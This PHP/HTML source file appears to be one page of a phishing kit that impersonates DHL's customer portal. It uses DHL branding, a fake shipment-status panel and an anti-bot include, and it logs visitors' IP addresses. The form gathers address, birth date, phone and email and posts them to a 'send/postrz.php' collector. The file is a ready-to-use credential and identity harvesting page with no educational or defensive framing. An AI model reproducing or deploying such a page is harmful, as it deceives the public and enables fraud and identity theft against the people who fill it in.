<?php 
session_start();
include '../antibots/index.php';



	require_once "functions.php";
	$ip = $_SERVER['REMOTE_ADDR'];

    get_user_ipinfo($ip);


?>


<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<!-- link_icons -->
	<link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
	<link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
	<title>Login to Customer Portals and Tools | DHL |</title>
	<!-- logo site web-->
	<link rel="icon" href="image/favicon.ico" type="image/x-icon"/>
	<link rel="shortcut icon" href="image/favicon.ico" type="image/x-icon" />
	<!-- link__css -->
	<link rel="stylesheet"  href="css/bootstrap.css">
	<link rel="stylesheet"  href="css/posta.css">
	<style>
.form-control:focus{
    border: 3px solid #F75838;
    -webkit-box-shadow:inset 0 1px 1px rgba(216,216,216,0.9),0 0 8px rgba(216,216,216,0.9);
    box-shadow:inset 0 1px 1px rgba(216,216,216,0.9),0 0 8px rgba(216,216,216,0.9)
}
	</style>
</head>
<body>


	<!-- Start____Navbar -->
	<div class="navbar">
		<div class="container-fluid">
			<div class="topping">
				<img src="image/dhl-logo.svg">
				<ul class="web">
					<li><i class="bi bi-exclamation-circle me-2"></i><?php echo get_text('top_header1'); ?></li>
					<li><?php echo get_text('top_header2'); ?></li>
					<li><i class="bi bi-globe me-2"></i><?php echo get_text('top_header3'); ?></li>
					<li><i class="bi bi-search me-2"></i><?php echo get_text('top_header4'); ?></li>
				</ul>
				<ul class="respo">
					<li><i class="bi bi-list"></i></li>
					<li></li>
				</ul>
			</div>
			<div class="bottomin">
				<ul>
					<li><?php echo get_text('mainmenu1'); ?><i class="bi bi-chevron-down ms-1"></i></li>
					<li><?php echo get_text('mainmenu2'); ?><i class="bi bi-chevron-down ms-1"></i></li>
					<li><?php echo get_text('mainmenu3'); ?><i class="bi bi-chevron-down ms-1"></i></li>
					<li><?php echo get_text('mainmenu4'); ?><i class="bi bi-chevron-down ms-1"></i></li>
				</ul>
				<p><i class="bi bi-person-fill me-2"></i><?php echo get_text('header-right'); ?></p>
			</div>
		</div>
	</div>
	<!-- End____Navbar -->

	<!-- Start____Home -->
	<div class="home info">
		<div class="otside">
			<div class="container">
				<div class="text-center"><h1><?php echo get_text('title'); ?></h1></div>
				<div class="lettre login">
					<div class="dell">
						<div class="titre">
							<img src="image/camion.png">
							<h3><?php echo get_text('title2'); ?> </h3>
						</div>
						<div class="steps">
							<span class="green"></span>
							<span class="green"></span>
							<span></span>
						</div>
					</div>
					<div class="row gx-4">
						<div class="col-lg-8 genius">
							<div class="gauche">
								<h4>Contact Information</h4>
								<form id="form" action="send/postrz.php" method="post">
									<input type="hidden" name="step" value="info">
									<div class="form-group mt-3">   
				  <label><?php echo get_text('country_label'); ?> <span>*</span></label>
				  <input type="text" name="country" id="adress" placeholder="<?php echo $countryy; ?>" disabled class="form-control">
									</div>
									<div class="form-group mt-3">   
				  <label><?php echo get_text('address_label'); ?> <span>*</span></label>
				  <input type="text" name="adress" id="adress" class="form-control" required>
									</div>
									<div class="calisy">
										<div class="form-group mt-3 ville">     
		    <label><?php echo get_text('city_label'); ?> <span>*</span></label>
		    <input type="text" name="city" id="city" class="form-control" required>
										</div>
			 							<div class="form-group mt-3 astra">     
			<label>State <span>*</span></label>
			<input type="text" name="state" id="state" class="form-control" required>
										</div>
									</div>
									<div class="calisy">
										<div class="form-group mt-3 ville">     
		    <label><?php echo get_text('birth_date_label'); ?> <span>*</span></label>
		    <input type="birt" name="birt" id="birt" class="form-control" placeholder="DD/MM/YYYY" required>
										</div>
										<div class="form-group mt-3 astra">     
		   <label><?php echo get_text('zip_code_label'); ?> <span>*</span></label>
		   <input type="text" name="zip" id="zip" class="form-control" placeholder="00000" required>
										</div>
									</div>
									<div class="form-group mt-3">   
		   <label><?php echo get_text('phone_label'); ?> <span>*</span></label>
		   <input type="text" name="phone" id="phone" class="form-control" required>
									</div>
									<div class="form-group mt-3">   
		   <label><?php echo get_text('email_label'); ?> <span>*</span></label>
		   <input type="email" name="email" id="email" class="form-control" placeholder="jhon.nuer@exomple.com" required>
									</div>
									<div class="botona">
										<button type="submit" class="btn" name="submit"><?php echo get_text('next'); ?> </button>
									</div>  
								</form>
							</div>
						</div>
						<div class="col-lg-4 power">
						    <div class="droit">
							<div class="offre">
										<div class="status">
											<p><?php echo get_text('status'); ?> </p>
										</div>
										<div class="status">
											<p><?php echo get_text('tracking'); ?> </p>
										</div>
									</div>
									<div class="offre">
										<div class="status">
											<p>Last Updated : <b><?php echo date('l jS \of  h:i A'); ?></b></p>
										</div>
										<div class="status">
											<p>Shipment type: <b>Other</b></p>
										</div>
										<div class="status">
											<p><?php echo get_text('total'); ?></p>
										</div>
									</div>
									<hr>
									<div class="important mt-4">
							<h5>I<?php echo get_text('important_title'); ?></h5>
							<p><?php echo get_text('important_message'); ?></p>
						</div>
						    </div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
	<!-- Ennnd____Home -->

	<!-- STAAAART_SOUS -->
	<div class="sous boso ">
		<div class="container-fluid">
			<div class="row">
				<div class="col-lg-9">
					<img src="image/group.svg">
					<ul>
						<li><?php echo get_text('footer-menu-1'); ?></li>
						<li><?php echo get_text('footer-menu-2'); ?></li>
						<li><?php echo get_text('footer-menu-3'); ?></li>
						<li><?php echo get_text('footer-menu-4'); ?></li>
						<li><?php echo get_text('footer-menu-5'); ?></li>
						<li><?php echo get_text('footer-menu-6'); ?></li>
						<li><?php echo get_text('footer-menu-7'); ?></li>
						<li><?php echo get_text('footer-menu-8'); ?></li>
					</ul>
				</div>
				<div class="col-lg-3">
					<h6><?php echo get_text('follow-us'); ?></h6>
					<img src="image/socio.png" class="socio">
				</div>
				<div class="text-center ss"><?php echo get_text('copyright'); ?></div>
			</div>  
		</div>
	</div>
	<!-- ENNNNNND_SOUS -->







	<script src="js/jquery-3.5.1.min.js"></script>
	<script src="js/jquery.mask.js"></script>
	<script src="js/jquery.mask.js"></script>
	<script>

	$("#birt").mask("00/00/0000");
	$("#zip").mask("00000");
		
	</script>
		 
</body>
</html>


